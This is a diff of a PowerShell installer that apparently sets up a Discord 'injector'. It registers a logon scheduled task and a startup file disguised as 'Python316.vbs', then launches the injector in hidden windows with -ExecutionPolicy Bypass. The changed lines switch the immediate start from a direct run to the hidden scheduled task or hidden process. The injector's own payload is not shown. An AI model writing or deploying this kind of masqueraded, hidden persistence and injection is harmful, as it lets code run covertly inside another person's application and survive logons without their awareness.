@@ -71,8 +71,8 @@ $startupVbs = Join-Path ([Environment]::GetFolderPath('Startup')) 'Python316.vbs
 $psExe      = (Get-Command powershell.exe).Source
 $argLine    = '-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "{0}"' -f $dstInjector
 
+$registered = $false
 if (-not $NoTask) {
-    $registered = $false
     try {
         $action   = New-ScheduledTaskAction -Execute $psExe -Argument $argLine
         $trigger  = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
@@ -97,9 +97,20 @@ if (-not $NoTask) {
 # ---------------------------------------------------------------- start now
 if (-not $NoStartNow) {
     Say ''
-    Say 'Attaching to Discord now (this can restart Discord once)...' 'Cyan'
-    & $psExe -NoProfile -ExecutionPolicy Bypass -File $dstInjector -Once
-    if ($LASTEXITCODE -eq 0) { Say 'Attach pass complete.' 'Green' }
+    Say 'Starting the watcher (attaches / restarts Discord once if needed)...' 'Cyan'
+    if ($registered) {
+        try {
+            Start-ScheduledTask -TaskName $TaskName
+            Say '  watcher started via scheduled task.' 'Green'
+        } catch {
+            Say "  could not start task ($($_.Exception.Message)); launching directly" 'Yellow'
+            Start-Process -FilePath $psExe -ArgumentList ('-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "{0}"' -f $dstInjector) -WindowStyle Hidden | Out-Null
+        }
+    } else {
+        Start-Process -FilePath $psExe -ArgumentList ('-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "{0}"' -f $dstInjector) -WindowStyle Hidden | Out-Null
+        Say '  watcher started.' 'Green'
+    }
+    Start-Sleep -Seconds 2
 } else {
     Say ''
     Say 'Skipped immediate attach (-NoStartNow). It will run at next Discord launch / logon.' 'Yellow'
